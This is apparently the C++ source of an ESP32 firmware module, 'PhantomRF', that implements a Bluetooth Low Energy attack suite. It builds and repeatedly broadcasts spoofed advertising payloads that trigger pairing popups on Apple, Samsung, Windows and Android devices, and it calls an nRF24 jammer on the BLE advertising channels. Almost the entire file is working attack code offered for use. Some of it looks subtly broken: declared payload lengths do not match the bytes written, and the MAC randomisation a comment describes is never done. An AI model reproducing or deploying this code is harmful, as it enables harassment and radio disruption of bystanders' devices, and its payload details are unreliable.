/**
 * @file BleAttack.cpp
 * @brief BLE attack suite — implementation
 *
 * Implements the BLE sub-mode attacks documented in DESIGN §5.4:
 *   - Scan: NimBLEScan pass for `scanDurationMs`, results in `lastResults_`
 *   - AppleSpam:    Apple Continuity HCI Command spam (popups)
 *   - SamsungSpam:  Galaxy Buds pairing spam
 *   - WindowsSpam:  Microsoft SwiftPair
 *   - FastPairSpam: Google Fast Pair
 *   - AdvJam:       delegates to Nrf24Jammer (BLE adv channels 37/38/39)
 *
 * The spam payloads are constructed directly as advertising PDUs and
 * broadcast via `NimBLEAdvertising::start()` with a custom data set.
 *
 * @author PhantomRF Project
 * @date 2026
 */
#include "modules/BleAttack/BleAttack.h"

#include <Arduino.h>
#include <string.h>
#include <esp_random.h>

#include "NimBLEDevice.h"
#include "NimBLEAdvertising.h"
#include "NimBLEScan.h"
#include "NimBLEUtils.h"

#include "core/EventBus.h"
#include "core/State.h"
#include "hal/Storage.h"
#include "hal/Board.h"
#include "modules/Nrf24Jammer/Nrf24Jammer.h"
#include "utils/Logger.h"

namespace phm::modules {

BleAttack g_bleAttack;

static constexpr UBaseType_t kTaskPrio  = 2;
static constexpr uint32_t    kTaskStack = 8192;
static constexpr BaseType_t  kTaskCore  = 0;
static constexpr const char* kTag       = "ble";

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------
void BleAttack::setup() {
    LOGI(kTag, "setup");
    NimBLEDevice::init("");
}

void BleAttack::loop() {
    // Nothing — workers do all the work.
}

void BleAttack::teardown() {
    stopAttack();
    NimBLEDevice::deinit(true);
}

// ---------------------------------------------------------------------------
// Start / stop
// ---------------------------------------------------------------------------
bool BleAttack::startAttack(const AttackConfig& cfg) {
    if (running_) {
        LOGW(kTag, "startAttack: already running — stopping first");
        stopAttack();
    }
    config_ = cfg;
    lastResults_.clear();
    running_ = true;
    g_state.currentModuleId = MODULE_ID;

    // Dispatch to the appropriate worker
    if (cfg.target == Target::Scan) {
        runScan();
        // runScan() is synchronous; mark idle again
        running_ = false;
        g_state.currentModuleId = 0;
        return true;
    }
    if (cfg.target == Target::AdvJam) {
        // Delegate to nRF24 jammer (BLE adv channels 37/38/39)
        Nrf24Jammer::AttackConfig nj;
        nj.target = Nrf24Jammer::Target::BleAdv;
        nj.method = Nrf24Jammer::Method::List;
        nj.sweep  = Nrf24Jammer::SweepMode::Together;
        g_nrf24Jammer.startAttack(nj);
        return true;
    }

    // Spam targets run on a worker task
    BaseType_t ok = xTaskCreatePinnedToCore(&BleAttack::taskEntry, "ble-spam",
                                            kTaskStack, this, kTaskPrio,
                                            &task_, kTaskCore);
    if (ok != pdPASS) {
        running_ = false;
        g_state.currentModuleId = 0;
        LOGE(kTag, "spam worker create failed");
        return false;
    }
    return true;
}

void BleAttack::stopAttack() {
    if (task_) {
        running_ = false;
        for (int i = 0; i < 50 && task_; ++i) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        if (task_) {
            vTaskDelete(task_);
            task_ = nullptr;
        }
    }
    stopAdvertising();
    if (g_nrf24Jammer.isRunning() &&
        g_state.currentModuleId == Nrf24Jammer::MODULE_ID) {
        g_nrf24Jammer.stopAttack();
    }
    running_ = false;
    g_state.currentModuleId = 0;
}

void BleAttack::stopAdvertising() {
    if (!owningAdvertising_) return;
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    if (adv) adv->stop();
    owningAdvertising_ = false;
}

void BleAttack::taskEntry(void* arg) {
    static_cast<BleAttack*>(arg)->workerThread();
    vTaskDelete(nullptr);
}

void BleAttack::workerThread() {
    switch (config_.target) {
        case Target::AppleSpam:    runAppleSpam();    break;
        case Target::SamsungSpam:  runSamsungSpam();  break;
        case Target::WindowsSpam:  runWindowsSpam();  break;
        case Target::FastPairSpam: runFastPairSpam(); break;
        default: break;
    }
    running_ = false;
    g_state.currentModuleId = 0;
    task_ = nullptr;
}

// ---------------------------------------------------------------------------
// Scan
// ---------------------------------------------------------------------------
namespace { class BleScanCb : public NimBLEScanCallbacks {
public:
    BleAttack* owner = nullptr;
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (!owner || !dev) return;
        BleAttack::BleDevice d{};
        NimBLEAddress a = dev->getAddress();
        std::string s = a.toString();
        strncpy(d.address, s.c_str(), sizeof(d.address) - 1);
        d.address[sizeof(d.address) - 1] = '\0';
        std::string n = dev->getName();
        if (!n.empty()) {
            strncpy(d.name, n.c_str(), sizeof(d.name) - 1);
            d.name[sizeof(d.name) - 1] = '\0';
        }
        d.rssi = dev->getRSSI();
        d.manufacturerId = 0;
        owner->lastScanResults().push_back(d);
    }
    void onScanEnd(const NimBLEScanResults&, int) override {}
}; }
static BleScanCb g_scanCb;

void BleAttack::runScan() {
    LOGI(kTag, "scan: start (%u ms)", config_.scanDurationMs);
    g_scanCb.owner = this;
    NimBLEScan* scan = NimBLEDevice::getScan();
    if (!scan) {
        LOGE(kTag, "NimBLEScan not available");
        return;
    }
    scan->setScanCallbacks(&g_scanCb, false);
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    lastResults_.clear();
    bool ok = scan->start(config_.scanDurationMs, false, true);
    if (ok) {
        LOGI(kTag, "scan: complete (%u results)",
             static_cast<unsigned>(lastResults_.size()));
    } else {
        LOGE(kTag, "scan: start failed");
    }
    scan->stop();
    scan->clearResults();
    g_scanCb.owner = nullptr;
}

// ---------------------------------------------------------------------------
// Spam workers
// ---------------------------------------------------------------------------
static void startAdvWithPayload(const std::string& payload, bool connectable) {
    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    if (!adv) return;
    adv->stop();
    // Use setManufacturerData for the spam payload (NimBLE exposes this
    // for arbitrary bytes that should appear in the manufacturer AD field)
    std::string p = payload;
    adv->setManufacturerData(p);
    adv->enableScanResponse(false);
    adv->setConnectableMode(connectable ? 1 : 0);
    adv->start();
}

// Apple Continuity HCI Command advertisement — triggers iOS popup
// "Pairing request from a nearby device"
void BleAttack::runAppleSpam() {
    LOGI(kTag, "Apple Continuity spam: start");
    uint8_t payload[64];
    size_t  payloadLen = 0;
    // Randomise the source MAC so the popups are not deduplicated
    while (running_) {
        buildApplePayload(payload, payloadLen);
        startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
        owningAdvertising_ = true;
        vTaskDelay(pdMS_TO_TICKS(50));
        // Hop to next adv channel (37 -> 38 -> 39 -> 37 ...)
        // NimBLE handles channel rotation internally; nothing to do here.
        if (!running_) break;
    }
    stopAdvertising();
    LOGI(kTag, "Apple Continuity spam: stop");
}

void BleAttack::runSamsungSpam() {
    LOGI(kTag, "Samsung Galaxy Buds spam: start");
    uint8_t payload[64];
    size_t  payloadLen = 0;
    while (running_) {
        buildSamsungPayload(payload, payloadLen);
        startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
        owningAdvertising_ = true;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    stopAdvertising();
    LOGI(kTag, "Samsung spam: stop");
}

void BleAttack::runWindowsSpam() {
    LOGI(kTag, "Windows Swift Pair spam: start");
    uint8_t payload[64];
    size_t  payloadLen = 0;
    while (running_) {
        buildWindowsPayload(payload, payloadLen);
        startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
        owningAdvertising_ = true;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    stopAdvertising();
    LOGI(kTag, "Windows spam: stop");
}

void BleAttack::runFastPairSpam() {
    LOGI(kTag, "Google Fast Pair spam: start");
    uint8_t payload[64];
    size_t  payloadLen = 0;
    while (running_) {
        buildFastPairPayload(payload, payloadLen);
        startAdvWithPayload(std::string(reinterpret_cast<const char*>(payload), payloadLen), false);
        owningAdvertising_ = true;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    stopAdvertising();
    LOGI(kTag, "Fast Pair spam: stop");
}

// ---------------------------------------------------------------------------
// Payload builders
//
// Each builder writes a complete BLE advertising PDU payload (the bytes
// after the 6-byte header) into `out` and updates `outLen`. The bytes
// are designed to be recognised by the respective platform's pairing
// service and trigger a popup / pairing prompt.
// ---------------------------------------------------------------------------

// Apple Continuity Protocol — Nearby Action (model id randomised)
void BleAttack::buildApplePayload(uint8_t* out, size_t& outLen) {
    // Random 16-bit model id (e.g. AirPods Pro, Beats, etc.)
    static const uint16_t kModels[] = {
        0x0220, 0x0F20, 0x1320, 0x0B20, 0x0A20, 0x0320,  // AirPods
        0x0B30, 0x0E20, 0x1020, 0x0620, 0x0F20,           // Beats
    };
    static const uint8_t kNumModels = sizeof(kModels) / 2;
    uint16_t model = kModels[esp_random() % kNumModels];

    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
    out[3] = 0x0B; out[4] = 0xFF;                     // Manufacturer Specific, length 11
    out[5] = 0x4C; out[6] = 0x00;                     // Apple company id
    out[7] = 0x07; out[8] = 0x19;                     // Continuity HCI Command type
    out[9] = static_cast<uint8_t>(model & 0xFF);
    out[10] = static_cast<uint8_t>(model >> 8);
    // Random auth tag
    uint32_t r = esp_random();
    memcpy(&out[11], &r, 3);
    out[14] = 0x00;  // additional byte
    outLen = 15;
}

void BleAttack::buildSamsungPayload(uint8_t* out, size_t& outLen) {
    // Galaxy Buds pairing beacon (model 0xEE9A on company 0x0075)
    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
    out[3] = 0x03; out[4] = 0xFF;                     // Manufacturer data length 3
    out[5] = 0x75; out[6] = 0x00;                     // Samsung company id (LE)
    out[7] = 0xAA;                                    // beacon type
    outLen = 8;
}

void BleAttack::buildWindowsPayload(uint8_t* out, size_t& outLen) {
    // Microsoft SwiftPair (company 0x0006, beacon 0x03)
    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
    out[3] = 0x03; out[4] = 0xFF;
    out[5] = 0x06; out[6] = 0x00;                     // Microsoft company id
    out[7] = 0x03;                                    // SwiftPair beacon id
    // Subtype + reserved + random salt
    out[8] = 0x00;
    out[9] = static_cast<uint8_t>(esp_random() & 0xFF);
    out[10] = static_cast<uint8_t>(esp_random() & 0xFF);
    outLen = 11;
}

void BleAttack::buildFastPairPayload(uint8_t* out, size_t& outLen) {
    // Google Fast Pair (company 0x000E, model id 0xFE2C or random)
    out[0] = 0x02; out[1] = 0x01; out[2] = 0x06;     // Flags
    out[3] = 0x03; out[4] = 0xFF;
    out[5] = 0x0E; out[6] = 0x00;                     // Google company id
    out[7] = static_cast<uint8_t>(esp_random() & 0xFF);  // model id byte
    out[8] = static_cast<uint8_t>(esp_random() & 0xFF);
    out[9] = 0x00;
    outLen = 10;
}

}  // namespace phm::modules
